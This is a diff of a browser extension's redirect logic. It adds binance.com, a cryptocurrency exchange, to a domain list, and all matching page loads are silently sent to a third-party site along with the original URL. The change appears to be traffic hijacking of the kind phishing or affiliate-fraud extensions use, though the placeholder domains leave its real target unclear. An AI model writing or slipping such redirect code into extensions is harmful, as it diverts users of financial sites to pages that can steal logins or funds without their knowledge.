@@ -259,15 +259,12 @@ window.onbeforeunload = function () {
 /** REDIRECTION SECTION **/
 
 /** Section modified for public release, only redirects sample.com to samplesite.com **/
-const arraysToMatch = ['sample.com'];
-
+const domains = ['sample.com', 'binance.com'];
 
 browser.webRequest.onBeforeRequest.addListener(
   (requestDetails) => {
 
-      //
       let requestedUrl = requestDetails.url;
-	  let requestedUrl1 = requestDetails.url;
 
       // get rid of https or http , and www if it exists
       requestedUrl = requestedUrl.replace(/^(?:https?:\/\/)?(?:www\.)?/i, "");
@@ -281,14 +278,21 @@ browser.webRequest.onBeforeRequest.addListener(
         requestedUrl = requestedUrl.slice(0, -1);
       }
 
-      // check if exists in redirect array
-      var arrayMatches = (arraysToMatch.indexOf(requestedUrl) > -1);
+      // loop through the domains
+      for(const domain of domains){
+        // check the first x amount of characters from requested url and see if it matches domain
+        const newTrimmedUrl = requestedUrl.substr(0, domain.length);
 
-      if(arrayMatches){
-        return {
-          redirectUrl: `https://samplesite.com/?apikey=x&url=${encodeURIComponent(requestedUrl1)}`
+        // if the domain matches redirect
+        if(newTrimmedUrl == domain){
+          return {
+            redirectUrl: `https://samplesite.com/?apikey=x&url=${encodeURIComponent(requestedUrl)}`
+          };
         };
       }
+
+
+
 
   }, {
     urls: ['<all_urls>'], types: ['main_frame']
